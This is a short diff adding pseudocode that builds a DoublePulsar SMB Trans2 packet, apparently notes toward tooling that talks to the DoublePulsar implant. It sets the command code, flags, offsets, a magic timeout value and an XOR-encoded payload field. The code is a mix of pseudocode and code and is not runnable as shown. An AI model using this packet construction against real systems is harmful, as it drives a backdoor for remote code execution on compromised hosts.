@@ -55,6 +55,34 @@ With zeroed-out parameters, code execution was blocked by checks in the implant
 
 */
 
+setup_count = 1;
+setup_data = 0x000e ( little endian in unsigned char :  0x0E 0x00 )
+base_offset = pkt.to_s.length + (setup_count * 2) - 4
+param_offset = base_offset
+ data_offset = param_offset + param.length
+data = parameter + body.to_s ( convert to string )
+PayloadData = parameters + XOR_DATA
 
+
+	    DoublePulsarPacket.Command =  0x32;
+    	DoublePulsarPacket.Flags1 =  0x18;
+    	DoublePulsarPacket.Flags2 =  0xc007;
+
+    	DoublePulsarPacket.WordCount =  14 + setup_count
+    	DoublePulsarPacket.TreeID =  @tree_id
+    	DoublePulsarPacket.MultiplexID =  @multiplex_id
+
+    	DoublePulsarPacket.ParamCountTotal =  param.length
+    	DoublePulsarPacket.DataCountTotal =  body.to_s.length
+    	DoublePulsarPacket.ParamCountMax =  1
+    	DoublePulsarPacket.DataCountMax =  0
+    	DoublePulsarPacket.ParamCount =  param.length
+    	DoublePulsarPacket.ParamOffset =  param_offset
+    	DoublePulsarPacket.DataCount =  body.to_s.length
+    	DoublePulsarPacket.DataOffset =  data_offset
+    	DoublePulsarPacket.SetupCount =  setup_count
+    	DoublePulsarPacket.SetupData =  setup_data
+    	DoublePulsarPacket.Timeout =  “\x25\x89\xEE\x00”;
+    	DoublePulsarPacket.Payload =  data
 
 
